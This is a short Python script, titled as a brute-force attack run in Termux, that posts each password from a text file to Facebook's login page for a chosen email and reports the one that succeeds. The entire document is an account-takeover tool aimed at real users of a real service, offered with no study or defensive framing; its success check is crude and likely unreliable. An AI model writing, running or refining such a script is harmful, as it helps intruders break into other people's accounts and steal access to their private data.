# Brute force attack in termux with python for fb, trying txt file password

import requests

def brute_force_facebook(email, password_file):
    url = 'https://www.facebook.com/login.php'
    with open(password_file, 'r') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        payload = {
            'email': email,
            'pass': password
        }
        response = requests.post(url, data=payload)
        
        if "login_error" not in response.text:
            print(f'Success! Password is: {password}')
            break
    else:
        print('All passwords tried, none worked.')

if __name__ == "__main__":
    email = input("Enter the Facebook email: ")
    password_file = input("Enter the path to the password file: ")
    brute_force_facebook(email, password_file)